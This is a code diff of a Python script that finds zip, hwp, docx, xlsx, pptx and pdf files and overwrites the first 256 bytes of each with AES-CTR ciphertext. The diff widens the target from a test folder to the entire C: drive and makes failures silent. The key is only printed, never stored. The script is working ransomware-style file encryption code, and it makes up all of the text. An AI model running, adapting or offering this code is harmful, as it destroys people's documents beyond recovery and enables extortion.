@@ -5,73 +5,65 @@ import binascii
 
 # AES encryption function
 def encrypt_aes_ctr(data, key, iv):
-    # Create a counter object for AES-CTR mode with a 128-bit block size.
     ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
     cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
-    
-    # Encrypt the data using AES-CTR mode.
     encrypted_data = cipher.encrypt(data)
-    
     return encrypted_data
 
-if __name__ == "__main__":
-    # Generate a 48-byte AES key (32 bytes for key + 16 bytes for IV).
-    key_iv = os.urandom(48)
+# Generate a 48-byte AES key (32 bytes for key + 16 bytes for IV).
+def generate_aes_key_iv():
+    Combine_key = os.urandom(48)
+    return Combine_key
 
-    # Print only the 48-byte AES key as a hexadecimal string.
-    key_iv_hex = key_iv.hex().upper()
+# Encrypt a file using AES-256 CTR mode.
+def encrypt_file(file_path, key, IV, byte_size=256):
+    try:
+        with open(file_path, 'rb+') as file:
+            binary_data = file.read(byte_size)
+            encrypted_data = encrypt_aes_ctr(binary_data, key[:32], IV)
+            file.seek(0)
+            file.write(encrypted_data)
+            remaining_data = file.read()
+            file.seek(byte_size)
+            file.write(remaining_data)
+            return True
+    except Exception as e:
+        # Do nothing if encryption fails
+        pass
+    return False
+
+# Encrypt all files in a folder and its subfolders.
+def encrypt_files_in_folder(Encrypt_folder_path, Combine_key):
+    file_list = []
+    extensions = ('zip', 'hwp', 'hwpx', 'xlsx', 'docx', 'pptx', 'pdf')
+
+    encryption_successful = True
+
+    for root, dirs, files in os.walk(Encrypt_folder_path):
+        for file in files:
+            ext = file.lower().split('.')[-1]
+            if ext in extensions:
+                file_path = os.path.join(root, file)
+                success = encrypt_file(file_path, Combine_key, Combine_key[32:])
+                if not success:
+                    encryption_successful = False
+
+    print_encryption_result(encryption_successful)
+
+# Print success or failure of encryption.
+def print_encryption_result(successful):
+    if successful:
+        print("Encryption Successful!")
+    else:
+        print("Encryption Failed for some files!")
+
+if __name__ == "__main__":
+    Combine_key = generate_aes_key_iv()
+    key = Combine_key[:32]
+    IV = Combine_key[32:]
+    key_iv_hex = Combine_key.hex().upper()
     print("AES Key (48 bytes in hex):", key_iv_hex)
 
-    # Specify the input folder path.
-    folder_path = 'C:/Users/kyj08/OneDrive/바탕 화면/Test/'  # Enter the desired folder path here.
+    Encrypt_folder_path = 'C:/'
 
-    # Create an empty list to store the file paths of all files in the folder.
-    file_list = []
-
-    # Recursively search for all files in the input folder and its subfolders,
-    # and add the paths of files with the specified extensions to the list.
-    extensions = ('zip', 'hwp', 'hwpx', 'xlsx', 'docx', 'pptx', 'pdf')  # Specify the extensions to search for
-    for root, dirs, files in os.walk(folder_path):
-        for file in files:
-            ext = file.lower().split('.')[-1]  # Get the file extension
-            if ext in extensions:
-                file_list.append(os.path.join(root, file))
-
-    # Define the byte_size to read from the beginning of each file.
-    byte_size = 256  # Fixed byte size
-
-    encryption_successful = True  # Flag to track encryption success
-
-    for file_path in file_list:
-        try:
-            with open(file_path, 'rb+') as file:
-                # Read the first byte_size bytes of the file as binary data.
-                binary_data = file.read(byte_size)
-
-                # Encrypt the binary_data using AES-256 CTR mode with the shared key and IV.
-                encrypted_data = encrypt_aes_ctr(binary_data, key_iv[:32], key_iv[32:])
-
-                # Seek back to the beginning of the file and write the encrypted_data.
-                file.seek(0)
-                file.write(encrypted_data)
-
-                # Convert the encrypted binary_data to uppercase hex values and print.
-                hex_data = binascii.hexlify(encrypted_data).decode('utf-8').upper()
-
-                # Write the remaining binary data (beyond byte_size) back to the file.
-                remaining_data = file.read()
-                file.seek(byte_size)
-                file.write(remaining_data)
-
-                # Print the results.
-                print(f"File partially encrypted: {file_path}")
-                # print("AES-CTR Encrypted Hex value:", hex_data)
-
-        except Exception as e:
-            print(f"An error occurred for file {file_path}: {e}")
-            encryption_successful = False
-
-    if encryption_successful:
-        print("Encryption Successful!")  # Print success message if all files are successfully encrypted
-    else:
-        print("Encryption Failed for some files!")  # Print failure message if encryption failed for some files
+    encrypt_files_in_folder(Encrypt_folder_path, Combine_key)
